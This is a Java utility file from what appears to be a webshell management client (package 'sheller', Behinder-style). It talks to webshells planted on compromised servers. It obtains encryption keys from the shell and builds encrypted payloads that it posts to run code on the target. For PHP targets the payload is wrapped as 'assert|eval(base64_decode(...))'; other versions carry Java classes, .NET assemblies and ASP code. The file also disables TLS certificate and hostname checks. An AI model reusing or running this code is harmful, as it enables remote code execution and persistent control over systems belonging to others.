package vip.youwe.sheller.utils;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.json.JSONObject;
import vip.youwe.sheller.core.Crypt;
import vip.youwe.sheller.core.Params;
import vip.youwe.sheller.ui.controller.MainController;
import vip.youwe.sheller.utils.jc.Run;

import javax.net.ssl.*;
import javax.tools.*;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.net.*;
import java.security.KeyManagementException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import java.util.zip.ZipInputStream;

public class Utils {

    private static Map<String, JavaFileObject> fileObjects = new ConcurrentHashMap();

    public static boolean checkIP(String ipAddress) {
        String ip = "([1-9]|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])(\\.(\\d|[1-9]\\d|1\\d{2}|2[0-4]\\d|25[0-5])){3}";
        Pattern pattern = Pattern.compile(ip);
        Matcher matcher = pattern.matcher(ipAddress);
        return matcher.matches();
    }

    public static boolean checkPort(String portTxt) {
        String port = "([0-9]{1,5})";
        Pattern pattern = Pattern.compile(port);
        Matcher matcher = pattern.matcher(portTxt);
        return (matcher.matches() && Integer.parseInt(portTxt) >= 1 && Integer.parseInt(portTxt) <= 65535);
    }

    public static Map<String, String> getKeyAndCookie(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
        String rawKey_2;
        HttpURLConnection urlConnection;
        URL url;
        disableSslVerification();
        Map<String, String> result = new HashMap<String, String>();
        StringBuffer sb = new StringBuffer();
        InputStreamReader isr = null;
        BufferedReader br = null;

        if (getUrl.indexOf("?") > 0) {
            url = new URL(getUrl + "&" + password + "=" + (new Random()).nextInt(1000));
        } else {
            url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
        }

        HttpURLConnection.setFollowRedirects(false);

        if (url.getProtocol().equals("https")) {
            if (MainController.currentProxy.get("proxy") != null) {
                Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
                urlConnection = (HttpsURLConnection) url.openConnection(proxy);
            } else {
                urlConnection = (HttpsURLConnection) url.openConnection();
            }

        } else if (MainController.currentProxy.get("proxy") != null) {
            Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
            urlConnection = (HttpURLConnection) url.openConnection(proxy);
        } else {

            urlConnection = (HttpURLConnection) url.openConnection();
        }

        for (String headerName : requestHeaders.keySet()) {
            urlConnection.setRequestProperty(headerName, requestHeaders.get(headerName));
        }
        if (urlConnection.getResponseCode() == 302 || urlConnection
                .getResponseCode() == 301) {
            String urlwithSession = ((String) ((List) urlConnection.getHeaderFields().get("Location")).get(0)).toString();
            if (!urlwithSession.startsWith("http")) {

                urlwithSession = url.getProtocol() + "://" + url.getHost() + ":" + ((url.getPort() == -1) ? url.getDefaultPort() : url.getPort()) + urlwithSession;
                urlwithSession = urlwithSession.replaceAll(password + "=[0-9]*", "");
            }
            result.put("urlWithSession", urlwithSession);
        }

        boolean error = false;
        String errorMsg = "";
        if (urlConnection.getResponseCode() == 500) {
            isr = new InputStreamReader(urlConnection.getErrorStream());
            error = true;
            errorMsg = "密钥获取失败,密码错误?";
        } else if (urlConnection.getResponseCode() == 404) {
            isr = new InputStreamReader(urlConnection.getErrorStream());
            error = true;
            errorMsg = "页面返回404错误";
        } else {
            isr = new InputStreamReader(urlConnection.getInputStream());
        }

        br = new BufferedReader(isr);
        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line);
        }
        br.close();
        if (error) {
            throw new Exception(errorMsg);
        }
        String rawKey_1 = sb.toString();

        String pattern = "[a-fA-F0-9]{16}";
        Pattern r = Pattern.compile(pattern);
        Matcher m = r.matcher(rawKey_1);
        if (!m.find()) {
            throw new Exception("页面存在，但是无法获取密钥!");
        }

        int start = 0, end = 0;
        int cycleCount = 0;
        while (true) {
            Map<String, String> KeyAndCookie = getRawKey(getUrl, password, requestHeaders);
            rawKey_2 = KeyAndCookie.get("key");
            byte[] temp = CipherUtils.bytesXor(rawKey_1.getBytes(), rawKey_2.getBytes());
            for (int i = 0; i < temp.length; i++) {

                if (temp[i] > 0) {
                    if (start == 0 || i <= start)
                        start = i;
                    break;
                }
            }
            for (int i = temp.length - 1; i >= 0; i--) {
                if (temp[i] > 0) {
                    if (i >= end)
                        end = i + 1;
                    break;
                }
            }
            if (end - start == 16) {
                result.put("cookie", KeyAndCookie.get("cookie"));
                result.put("beginIndex", start + "");
                result.put("endIndex", (temp.length - end) + "");

                break;
            }

            if (cycleCount > 10) {
                throw new Exception("Can't figure out the key!");
            }

            cycleCount++;
        }

        String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));


        result.put("key", finalKey);

        return result;
    }

    public static String getKey(String password) throws Exception {
        return getMD5(password);
    }

    public static Map<String, String> getRawKey(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
        HttpURLConnection urlConnection;
        URL url;
        Map<String, String> result = new HashMap<String, String>();
        StringBuffer sb = new StringBuffer();
        InputStreamReader isr = null;
        BufferedReader br = null;

        if (getUrl.indexOf("?") > 0) {
            url = new URL(getUrl + "&" + password + "=" + (new Random()).nextInt(1000));
        } else {
            url = new URL(getUrl + "?" + password + "=" + (new Random()).nextInt(1000));
        }

        HttpURLConnection.setFollowRedirects(false);

        if (url.getProtocol().equals("https")) {
            urlConnection = (HttpsURLConnection) url.openConnection();
        } else {
            urlConnection = (HttpURLConnection) url.openConnection();
        }

        for (String headerName : requestHeaders.keySet()) {
            urlConnection.setRequestProperty(headerName, (String) requestHeaders.get(headerName));
        }
        String cookieValues = "";

        Map<String, List<String>> headers = urlConnection.getHeaderFields();
        for (String headerName : headers.keySet()) {
            if (headerName == null)
                continue;
            if (headerName.equalsIgnoreCase("Set-Cookie")) {
                for (String cookieValue : headers.get(headerName)) {
                    cookieValue = cookieValue.replaceAll(";[\\s]*path=[\\s\\S]*;?", "");
                    cookieValues = cookieValues + ";" + cookieValue;
                }
                cookieValues = cookieValues.startsWith(";") ? cookieValues.replaceFirst(";", "") : cookieValues;
                break;
            }
        }
        result.put("cookie", cookieValues);
        boolean error = false;
        String errorMsg = "";
        if (urlConnection.getResponseCode() == 500) {
            isr = new InputStreamReader(urlConnection.getErrorStream());
            error = true;
            errorMsg = "密钥获取失败,密码错误?";
        } else if (urlConnection.getResponseCode() == 404) {
            isr = new InputStreamReader(urlConnection.getErrorStream());
            error = true;
            errorMsg = "页面返回404错误";
        } else {
            isr = new InputStreamReader(urlConnection.getInputStream());
        }

        br = new BufferedReader(isr);
        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line);
        }
        br.close();
        if (error) {
            throw new Exception(errorMsg);
        }
        result.put("key", sb.toString());
        return result;
    }

    public static String sendPostRequest(String urlPath, String cookie, String data) throws Exception {
        StringBuilder result = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals(""))
            conn.setRequestProperty("Cookie", cookie);
        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data.getBytes());
        outwritestream.flush();
        outwritestream.close();
        if (conn.getResponseCode() == 200) {


            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null)
                result = result.append(line + "\n");
        }
        return result.toString();
    }


    public static Map<String, Object> requestAndParse(String urlPath, Map<String, String> header, byte[] data, int beginIndex, int endIndex) throws Exception {
        Map<String, Object> resultObj = sendPostRequestBinary(urlPath, header, data);
        byte[] resData = (byte[]) resultObj.get("data");
        if (beginIndex != 0 || endIndex != 0) {
            if (resData.length - endIndex >= beginIndex) {
                resData = Arrays.copyOfRange(resData, beginIndex, resData.length - endIndex);
            }
        }

        resultObj.put("data", resData);
        return resultObj;
    }

    public static Map<String, Object> sendPostRequestBinary(String urlPath, Map<String, String> header, byte[] data) throws Exception {
        HttpURLConnection conn;
        Map<String, Object> result = new HashMap<String, Object>();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        URL url = new URL(urlPath);

        if (MainController.currentProxy.get("proxy") != null) {
            Proxy proxy = (Proxy) MainController.currentProxy.get("proxy");
            conn = (HttpURLConnection) url.openConnection(proxy);
        } else {
            conn = (HttpURLConnection) url.openConnection();
        }

        conn.setRequestProperty("Content-Type", "application/octet-stream");
        conn.setRequestMethod("POST");
        if (header != null) {
            for (String key : header.keySet()) {
                conn.setRequestProperty(key, (String) header.get(key));
            }
        }
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);

        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();
        if (conn.getResponseCode() == 200) {
            DataInputStream din = new DataInputStream(conn.getInputStream());
            byte[] buffer = new byte[1024];
            int length = 0;
            while ((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
            }
        } else {

            DataInputStream din = new DataInputStream(conn.getErrorStream());
            byte[] buffer = new byte[1024];
            int length = 0;
            while ((length = din.read(buffer)) != -1) {
                bos.write(buffer, 0, length);
            }

            throw new Exception(new String(bos.toByteArray(), "GBK"));
        }
        byte[] resData = bos.toByteArray();

        result.put("data", resData);
        Map<String, String> responseHeader = new HashMap<String, String>();
        for (String key : conn.getHeaderFields().keySet()) {
            responseHeader.put(key, conn.getHeaderField(key));
        }
        responseHeader.put("status", conn.getResponseCode() + "");
        result.put("header", responseHeader);
        return result;
    }

    public static String sendPostRequest(String urlPath, String cookie, byte[] data) throws Exception {
        StringBuilder sb = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestProperty("Content-Type", "application/octet-stream");

        conn.setRequestMethod("POST");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals(""))
            conn.setRequestProperty("Cookie", cookie);
        OutputStream outwritestream = conn.getOutputStream();
        outwritestream.write(data);
        outwritestream.flush();
        outwritestream.close();

        if (conn.getResponseCode() == 200) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null)
                sb = sb.append(line + "\n");
        } else {
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null)
                sb = sb.append(line + "\n");
            throw new Exception("请求返回异常" + sb.toString());
        }
        String result = sb.toString();
        if (result.endsWith("\n"))
            result = result.substring(0, result.length() - 1);
        return result;
    }

    public static String sendGetRequest(String urlPath, String cookie) throws Exception {
        StringBuilder sb = new StringBuilder();
        URL url = new URL(urlPath);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestProperty("Content-Type", "text/plain");
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        conn.setDoInput(true);
        conn.setUseCaches(false);
        if (cookie != null && !cookie.equals("")) {
            conn.setRequestProperty("Cookie", cookie);
        }
        if (conn.getResponseCode() == 200) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null)
                sb = sb.append(line + "\n");
        } else {
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8"));
            String line;
            while ((line = reader.readLine()) != null)
                sb = sb.append(line + "\n");
            throw new Exception("请求返回异常" + sb.toString());
        }
        String result = sb.toString();
        if (result.endsWith("\n"))
            result = result.substring(0, result.length() - 1);
        return result;
    }

    public static byte[] getEvalData(String key, int encryptType, String type, byte[] payload) throws Exception {
        byte[] result = null;
        if (type.equals("jsp")) {
            byte[] encrypedBincls = Crypt.Encrypt(payload, key);
            String basedEncryBincls = Base64.encode(encrypedBincls);
            result = basedEncryBincls.getBytes();
        } else if (type.equals("php")) {
            byte[] bincls = ("assert|eval(base64_decode('" + Base64.encode(payload) + "'));").getBytes();
            byte[] encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
            result = Base64.encode(encrypedBincls).getBytes();
        } else if (type.equals("aspx")) {
            Map<String, String> params = new LinkedHashMap<String, String>();
            params.put("code", new String(payload));
            result = getData(key, encryptType, "Eval", params, type);
        } else if (type.equals("asp")) {
            byte[] encrypedBincls = Crypt.EncryptForAsp(payload, key);
            result = encrypedBincls;
        }
        return result;
    }

    public static byte[] getPluginData(String key, int encryptType, String payloadPath, Map<String, String> params, String type) throws Exception {
        if (type.equals("jsp")) {
            return Params.getParamedClassForPlugin(payloadPath, params);
        }

        if (type.equals("php")) {
            byte[] bincls = Params.getParamedPhp(payloadPath, params);


            bincls = Base64.encode(bincls).getBytes();
            bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();

            byte[] encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
            return Base64.encode(encrypedBincls).getBytes();
        }
        if (type.equals("aspx")) {
            byte[] bincls = Params.getParamedAssembly(payloadPath, params);

            return Crypt.EncryptForCSharp(bincls, key);
        }
        if (type.equals("asp")) {
            byte[] bincls = Params.getParamedAsp(payloadPath, params);


            return Crypt.EncryptForAsp(bincls, key);
        }

        return null;
    }


    public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type) throws Exception {
        return getData(key, encryptType, className, params, type, null);
    }


    public static String map2Str(Map<String, String> paramsMap) {
        String result = "";
        for (String key : paramsMap.keySet()) {
            result = result + key + "^" + (String) paramsMap.get(key) + "\n";
        }
        return result;
    }

    public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type, byte[] extraData) throws Exception {
        if (type.equals("jsp")) {
            className = "vip.youwe.sheller.payload.java." + className;
            byte[] bincls = Params.getParamedClass(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(bincls, extraData);
            }
            byte[] encrypedBincls = Crypt.Encrypt(bincls, key);
            String basedEncryBincls = Base64.encode(encrypedBincls);
            return basedEncryBincls.getBytes();
        }
        if (type.equals("php")) {
            byte[] bincls = Params.getParamedPhp(className, params);


            bincls = Base64.encode(bincls).getBytes();
            bincls = ("assert|eval(base64_decode('" + new String(bincls) + "'));").getBytes();
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(bincls, extraData);
            }
            byte[] encrypedBincls = Crypt.EncryptForPhp(bincls, key, encryptType);
            return Base64.encode(encrypedBincls).getBytes();
        }
        if (type.equals("aspx")) {
            byte[] bincls = Params.getParamedAssembly(className, params);
            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(bincls, extraData);
            }
            return Crypt.EncryptForCSharp(bincls, key);
        }
        if (type.equals("asp")) {
            byte[] bincls = Params.getParamedAsp(className, params);

            if (extraData != null) {
                bincls = CipherUtils.mergeByteArray(bincls, extraData);
            }
            return Crypt.EncryptForAsp(bincls, key);
        }

        return null;
    }


    public static byte[] getFileData(String filePath) throws Exception {
        byte[] fileContent = new byte[0];
        FileInputStream fis = new FileInputStream(new File(filePath));
        byte[] buffer = new byte[10240000];
        int length = 0;
        while ((length = fis.read(buffer)) > 0) {
            fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length));
        }
        fis.close();
        return fileContent;
    }

    public static List<byte[]> splitBytes(byte[] content, int size) throws Exception {
        List<byte[]> result = new ArrayList<byte[]>();
        byte[] buffer = new byte[size];
        ByteArrayInputStream bis = new ByteArrayInputStream(content);
        int length = 0;
        while ((length = bis.read(buffer)) > 0) {
            result.add(Arrays.copyOfRange(buffer, 0, length));
        }
        bis.close();
        return result;
    }


    public static void setClipboardString(String text) {
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();

        Transferable trans = new StringSelection(text);

        clipboard.setContents(trans, null);
    }

    public static byte[] getResourceData(String filePath) throws Exception {
        InputStream is = Utils.class.getClassLoader().getResourceAsStream(filePath);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buffer = new byte[102400];
        int num = 0;
        while ((num = is.read(buffer)) != -1) {
            bos.write(buffer, 0, num);
            bos.flush();
        }
        is.close();
        return bos.toByteArray();
    }

    public static byte[] ascii2unicode(String str, int type) throws Exception {
        ByteArrayOutputStream buf = new ByteArrayOutputStream();
        DataOutputStream out = new DataOutputStream(buf);

        for (byte b : str.getBytes()) {
            out.writeByte(b);
            out.writeByte(0);
        }
        if (type == 1)
            out.writeChar(0);
        return buf.toByteArray();
    }

    public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        output.write(a);
        output.write(b);
        return output.toByteArray();
    }


    public static byte[] getClassFromSourceCode(String sourceCode) throws Exception {
        return Run.getClassFromSourceCode(sourceCode);
    }


    public static String getSelfPath() throws Exception {
        String currentPath = Utils.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
        return new File(currentPath).getCanonicalPath();
    }


    public static JSONObject parsePluginZip(String zipFilePath) throws Exception {
        String pluginRootPath = getSelfPath() + "/Plugins";
        String pluginName = "";

        ZipFile zf = new ZipFile(zipFilePath);
        InputStream in = new BufferedInputStream(new FileInputStream(zipFilePath));
        ZipInputStream zin = new ZipInputStream(in);
        ZipEntry ze;
        while ((ze = zin.getNextEntry()) != null) {
            if (ze.getName().equals("plugin.config")) {

                BufferedReader br = new BufferedReader(new InputStreamReader(zf.getInputStream(ze)));

                Properties pluginConfig = new Properties();
                pluginConfig.load(br);
                pluginName = pluginConfig.getProperty("name");
                br.close();
            }
        }
        zin.closeEntry();

        String pluginPath = pluginRootPath + "/" + pluginName;

        ZipUtil.unZipFiles(zipFilePath, pluginPath);
        FileInputStream fis = new FileInputStream(pluginPath + "/plugin.config");
        Properties pluginConfig = new Properties();
        pluginConfig.load(fis);

        JSONObject pluginEntity = new JSONObject();
        pluginEntity.put("name", pluginName);
        pluginEntity.put("version", pluginConfig.getProperty("version", "v1.0"));
        pluginEntity.put("entryFile", pluginConfig.getProperty("entry", "index.htm"));
        pluginEntity.put("icon", pluginConfig.getProperty("icon", "/Users/rebeyond/host.png"));
        pluginEntity.put("scriptType", pluginConfig.getProperty("scriptType"));
        pluginEntity.put("isGetShell", pluginConfig.getProperty("isGetShell"));
        pluginEntity.put("type", pluginConfig.getProperty("type"));
        pluginEntity.put("author", pluginConfig.getProperty("author"));
        pluginEntity.put("link", pluginConfig.getProperty("link"));
        pluginEntity.put("qrcode", pluginConfig.getProperty("qrcode"));
        pluginEntity.put("comment", pluginConfig.getProperty("comment"));

        return pluginEntity;
    }

    public static <T> T json2Obj(JSONObject json, Class target) throws Exception {
        Object obj = target.newInstance();
        for (Field f : target.getDeclaredFields()) {

            try {
                String filedName = f.getName();
                String setName = "set" + filedName.substring(0, 1).toUpperCase() + filedName.substring(1);
                Method m = target.getMethod(setName, String.class);
                m.invoke(obj, json.get(filedName).toString());
            } catch (Exception e) {
            }
        }

        return (T) obj;
    }


    public static String getMD5(String clearText) throws Exception {
        MessageDigest m = MessageDigest.getInstance("MD5");
        m.update(clearText.getBytes(), 0, clearText.length());
        // return (new BigInteger(true, m.digest())).toString(16).substring(0, 16);
        return (new BigInteger(1, m.digest())).toString(16).substring(0, 16);
    }

    public static void main(String[] args) {
        String sourceCode = "package vip.youwe.sheller.utils;public class Hello{    public String sayHello (String name) {return \"Hello,\" + name + \"!\";}}";
        try {
            getClassFromSourceCode(sourceCode);
        } catch (Exception e) {

            e.printStackTrace();
        }
    }

    public static class MyJavaFileObject extends SimpleJavaFileObject {
        private String source;
        private ByteArrayOutputStream outPutStream;

        public MyJavaFileObject(String name, String source) {
            super(URI.create("String:///" + name + JavaFileObject.Kind.SOURCE.extension), JavaFileObject.Kind.SOURCE);
            this.source = source;
        }

        public MyJavaFileObject(String name, JavaFileObject.Kind kind) {
            super(URI.create("String:///" + name + kind.extension), kind);
            this.source = null;
        }


        public CharSequence getCharContent(boolean ignoreEncodingErrors) {
            if (this.source == null) {
                throw new IllegalArgumentException("source == null");
            }
            return this.source;
        }

        public OutputStream openOutputStream() throws IOException {
            this.outPutStream = new ByteArrayOutputStream();
            return this.outPutStream;
        }

        public byte[] getCompiledBytes() {
            return this.outPutStream.toByteArray();
        }
    }

    private static class MySSLSocketFactory extends SSLSocketFactory {
        private SSLSocketFactory sf;
        private String[] enabledCiphers;

        private MySSLSocketFactory(SSLSocketFactory sf, String[] enabledCiphers) {
            this.sf = null;
            this.enabledCiphers = null;


            this.sf = sf;
            this.enabledCiphers = enabledCiphers;
        }

        private Socket getSocketWithEnabledCiphers(Socket socket) {
            if (this.enabledCiphers != null && socket != null && socket instanceof SSLSocket) {
                ((SSLSocket) socket).setEnabledCipherSuites(this.enabledCiphers);
            }
            return socket;
        }


        public Socket createSocket(Socket s, String host, int port, boolean autoClose) throws IOException {
            return getSocketWithEnabledCiphers(this.sf.createSocket(s, host, port, autoClose));
        }


        public String[] getDefaultCipherSuites() {
            return this.sf.getDefaultCipherSuites();
        }


        public String[] getSupportedCipherSuites() {
            if (this.enabledCiphers == null) {
                return this.sf.getSupportedCipherSuites();
            }
            return this.enabledCiphers;
        }


        public Socket createSocket(String host, int port) throws IOException, UnknownHostException {
            return getSocketWithEnabledCiphers(this.sf.createSocket(host, port));
        }


        public Socket createSocket(InetAddress address, int port) throws IOException {
            return getSocketWithEnabledCiphers(this.sf.createSocket(address, port));
        }


        public Socket createSocket(String host, int port, InetAddress localAddress, int localPort) throws IOException, UnknownHostException {
            return getSocketWithEnabledCiphers(this.sf.createSocket(host, port, localAddress, localPort));
        }


        public Socket createSocket(InetAddress address, int port, InetAddress localaddress, int localport) throws IOException {
            return getSocketWithEnabledCiphers(this.sf.createSocket(address, port, localaddress, localport));
        }
    }


    private static void disableSslVerification() {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() {
                    return null;
                }

                public void checkClientTrusted(X509Certificate[] certs, String authType) {
                }

                public void checkServerTrusted(X509Certificate[] certs, String authType) {
                }
            }};
            SSLContext sc = SSLContext.getInstance("SSL");

            sc.init(null, trustAllCerts, new SecureRandom());

            List<String> cipherSuites = new ArrayList<String>();
            for (String cipher : sc.getSupportedSSLParameters().getCipherSuites()) {
                if (cipher.indexOf("_DHE_") < 0 && cipher.indexOf("_DH_") < 0) {
                    cipherSuites.add(cipher);
                }
            }

            HttpsURLConnection.setDefaultSSLSocketFactory(
                    new MySSLSocketFactory(sc.getSocketFactory(), cipherSuites.toArray(new String[0])));
                    // new MySSLSocketFactory(sc.getSocketFactory(), (String[]) cipherSuites.toArray(new String[0]), null));

            HostnameVerifier allHostsValid = (hostname, session) -> true;

            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (KeyManagementException e) {
            e.printStackTrace();
        }
    }

    public static class MyJavaFileManager extends ForwardingJavaFileManager<JavaFileManager> {
        protected MyJavaFileManager(JavaFileManager fileManager) {
            super(fileManager);
        }


        public JavaFileObject getJavaFileForInput(JavaFileManager.Location location, String className, JavaFileObject.Kind kind) throws IOException {
            JavaFileObject javaFileObject = (JavaFileObject) fileObjects.get(className);
            if (javaFileObject == null) {
                super.getJavaFileForInput(location, className, kind);
            }
            return javaFileObject;
        }


        public JavaFileObject getJavaFileForOutput(JavaFileManager.Location location, String qualifiedClassName, JavaFileObject.Kind kind, FileObject sibling) throws IOException {
            JavaFileObject javaFileObject = new Utils.MyJavaFileObject(qualifiedClassName, kind);
            fileObjects.put(qualifiedClassName, javaFileObject);
            return javaFileObject;
        }
    }


    public static Map<String, String> jsonToMap(JSONObject obj) {
        Map<String, String> result = new HashMap<String, String>();
        for (String key : obj.keySet()) {
            result.put(key, (String) obj.get(key));
        }
        return result;
    }

    public static Timestamp stringToTimestamp(String timeString) {
        Timestamp timestamp = null;
        try {
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss.SSS");
            Date parsedDate = dateFormat.parse(timeString);
            timestamp = new Timestamp(parsedDate.getTime());
        } catch (Exception exception) {
        }

        return timestamp;
    }
}
